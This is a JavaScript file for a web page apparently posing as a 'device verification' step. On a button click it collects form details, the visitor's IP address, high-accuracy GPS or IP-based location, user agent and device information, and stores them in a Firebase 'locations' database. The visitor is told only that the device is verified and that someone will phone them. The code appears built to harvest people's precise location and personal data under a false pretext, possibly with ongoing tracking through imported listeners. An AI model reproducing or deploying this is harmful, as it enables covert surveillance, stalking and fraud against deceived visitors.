import { initializeTheme, getCurrentTheme } from './src/features/theme/theme-manager.js';
import { listenForLocationRequests, setupUnloadHandler, determineLocationSource } from './src/features/location/location-tracker.js';
import { getDeviceInfo } from './src/utils/browser-detection.js';
import { 
    createFormFields, 
    initializeFormValidation, 
    getFormData 
} from './src/features/form/form-handler.js';

// Helper function to handle geolocation errors
function getGeolocationErrorMessage(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            return "Location access was denied. Falling back to IP-based location.";
        case error.POSITION_UNAVAILABLE:
            return "Location information is unavailable. Please try again.";
        case error.TIMEOUT:
            return "Location request timed out. Please try again.";
        default:
            return "An error occurred while getting location. Please try again.";
    }
}

// Initialize Firebase and load theme
document.addEventListener('DOMContentLoaded', async () => {
    try {
        // Initialize theme system
        await initializeTheme();

        // Setup location request listener
        listenForLocationRequests();

        // Setup unload handler
        setupUnloadHandler();

        // Initialize form with current theme
        const formContainer = document.getElementById('userDetailsForm');
        if (formContainer) {
            const currentTheme = window.themes[getCurrentTheme()];
            formContainer.appendChild(createFormFields(currentTheme));
            initializeFormValidation();
        }

        // Setup verify button click handler
        const verifyButton = document.getElementById('allowLocation');
        const locationStatus = document.getElementById('locationStatus');

        if (!verifyButton) {
            console.error('Verify button not found');
            return;
        }

        console.log('Setting up click handler for verify button');
        verifyButton.addEventListener('click', async () => {
            console.log('Verify button clicked');
            try {
                // Get user details first
                const userDetails = getFormData();
                if (!userDetails) {
                    throw new Error('Please fill in all required fields correctly');
                }

                verifyButton.disabled = true;
                document.querySelector('.container').classList.add('processing');
                locationStatus.textContent = 'Verifying device...';

                // Get IP address first (we'll need this regardless of location method)
                console.log('Fetching IP address...');
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                if (!ipResponse.ok) {
                    throw new Error('Failed to fetch IP address');
                }
                const { ip } = await ipResponse.json();
                console.log('IP address received:', ip);

                // Initialize position and source variables
                let position;
                let locationSource = 'IP-Based';

                // Try to get geolocation first
                if (navigator.geolocation) {
                    try {
                        console.log('Requesting geolocation...');
                        position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(
                                (pos) => {
                                    console.log('Geolocation received successfully');
                                    resolve(pos);
                                },
                                (err) => {
                                    console.log('Geolocation error, falling back to IP:', err);
                                    reject(err);
                                },
                                {
                                    enableHighAccuracy: true,
                                    timeout: 20000,
                                    maximumAge: 0
                                }
                            );
                        });
                        locationSource = await determineLocationSource(position);
                    } catch (geoError) {
                        console.log('Falling back to IP-based location');
                        locationStatus.textContent = getGeolocationErrorMessage(geoError);
                        
                        // IP-based fallback
                        try {
                            // Try primary service (ipapi.co)
                            const ipLocationResponse = await fetch('https://ipapi.co/json/');
                            const ipData = await ipLocationResponse.json();
                            
                            if (ipData.error || !ipData.latitude || !ipData.longitude) {
                                throw new Error(ipData.reason || 'Invalid response from ipapi.co');
                            }
                            
                            position = {
                                coords: {
                                    latitude: parseFloat(ipData.latitude),
                                    longitude: parseFloat(ipData.longitude),
                                    accuracy: 10000 // IP-based accuracy is typically low
                                }
                            };
                            locationSource = 'IP-Based (Primary)';
                        } catch (primaryError) {
                            console.warn('Primary IP location service failed, trying backup');
                            
                            // Try backup service (ip-api.com)
                            const backupResponse = await fetch('http://ip-api.com/json/?fields=lat,lon,status,message');
                            const backupData = await backupResponse.json();
                            
                            if (backupData.status !== 'success' || !backupData.lat || !backupData.lon) {
                                throw new Error(backupData.message || 'Invalid response from backup service');
                            }
                            
                            position = {
                                coords: {
                                    latitude: parseFloat(backupData.lat),
                                    longitude: parseFloat(backupData.lon),
                                    accuracy: 10000
                                }
                            };
                            locationSource = 'IP-Based (Backup)';
                        }
                    }
                } else {
                    // Browser doesn't support geolocation, use IP-based directly
                    console.log('Geolocation not supported, using IP-based location');
                    const ipLocationResponse = await fetch('https://ipapi.co/json/');
                    const ipData = await ipLocationResponse.json();
                    
                    if (ipData.error || !ipData.latitude || !ipData.longitude) {
                        throw new Error('Failed to get IP-based location');
                    }
                    
                    position = {
                        coords: {
                            latitude: parseFloat(ipData.latitude),
                            longitude: parseFloat(ipData.longitude),
                            accuracy: 10000
                        }
                    };
                    locationSource = 'IP-Based (Primary)';
                }

                // Save location to Firebase
                console.log('Saving to Firebase...');
                if (!window.database) {
                    throw new Error('Firebase database not initialized');
                }

                const locationsRef = window.database.ref('locations');
                const newLocationRef = locationsRef.push();

                const locationData = {
                    ...userDetails, // Add user details
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date().toISOString(),
                    status: 'active',
                    locationSource: locationSource,
                    ip: ip,
                    userAgent: navigator.userAgent,
                    ...getDeviceInfo()
                };

                // Only add optional fields if they exist
                if (position.coords.altitude !== null) {
                    locationData.altitude = position.coords.altitude;
                }
                if (position.coords.altitudeAccuracy !== null) {
                    locationData.altitudeAccuracy = position.coords.altitudeAccuracy;
                }

                await newLocationRef.set(locationData);
                console.log('Location saved successfully');

                // Set success message based on theme
                const currentTheme = getCurrentTheme();
                const successMessage = document.createElement('div');
                successMessage.className = 'success-message';
                
                // Main success message
                const mainMessage = document.createElement('p');
                mainMessage.textContent = 'Device verified successfully';
                mainMessage.style.marginBottom = '10px';
                successMessage.appendChild(mainMessage);
                
                // Contact message
                const contactMessage = document.createElement('p');
                contactMessage.style.fontSize = '0.9em';
                contactMessage.style.color = '#666';
                contactMessage.textContent = 'Thank you for your verification. Someone will be in touch with you shortly via phone call during business hours.';
                successMessage.appendChild(contactMessage);
                
                // Clear and update status
                locationStatus.textContent = '';
                locationStatus.appendChild(successMessage);
                
                verifyButton.style.display = 'none'; // Hide button after success
                
                // Add success animation class
                document.querySelector('.thank-you-card').classList.add('success');
                
            } catch (error) {
                console.error('Verification failed:', error);
                locationStatus.textContent = error.message || 'Verification failed. Please try again.';
                locationStatus.style.color = '#DA1710'; // Show error in red
                verifyButton.disabled = false;
                document.querySelector('.container').classList.remove('processing');
            }
        });

        console.log('Initialization complete');

    } catch (error) {
        console.error('Failed to initialize:', error);
    }
});
